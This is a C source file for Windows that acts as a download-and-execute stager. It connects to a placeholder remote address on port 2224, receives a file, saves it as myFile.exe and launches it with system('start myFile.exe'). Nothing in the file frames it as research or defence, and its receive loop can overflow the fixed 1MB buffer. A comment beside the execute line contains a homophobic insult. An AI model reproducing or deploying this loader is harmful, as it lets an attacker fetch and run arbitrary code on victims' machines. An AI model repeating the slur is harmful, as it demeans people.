#define  _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_PORT    2224
#define DEFAULT_ADDR    "XX.XX.XX.XX"

SOCKET *FileServerConnect(void)
{
    WSADATA wsaData;
    SOCKET    *s;
    SOCKADDR_IN    sockInfo;
    int ret;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    s = (SOCKET *)malloc(sizeof(SOCKET));
    *s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockInfo.sin_family = AF_INET;
    sockInfo.sin_port = htons(DEFAULT_PORT);
    sockInfo.sin_addr.S_un.S_addr = inet_addr(DEFAULT_ADDR);
    ret = connect(*s, (SOCKADDR *)&sockInfo, sizeof sockInfo);

    if (ret != 0)
    {
        printf("[ERROR] Connect failed! :(");
        getchar();
        exit(-1);
    }

    return s;
}


static char fileBuffer[0x100000];    //1MB MAX 

int __cdecl main(int argc, char **argv) 
{
    SOCKET    *socket;
    FILE    *out;
    unsigned int recvCount = 0;
    unsigned int size;

    socket = FileServerConnect();
    recv(*socket, (char *)&size, sizeof(size), 0);    //First 4 bytes are file size
    printf("file size: %u", size);

    while (recvCount < size)
    {
        recvCount += recv(*socket, fileBuffer + recvCount, size, 0);
    }

    out = fopen("myFile.exe", "wb");
    fwrite(fileBuffer, recvCount, 1,out); 
    fclose(out);
    closesocket(*socket);
    system("start myFile.exe");            //Antartic is gay

    free(socket);
    WSACleanup();
    getchar();

    return 0;
}
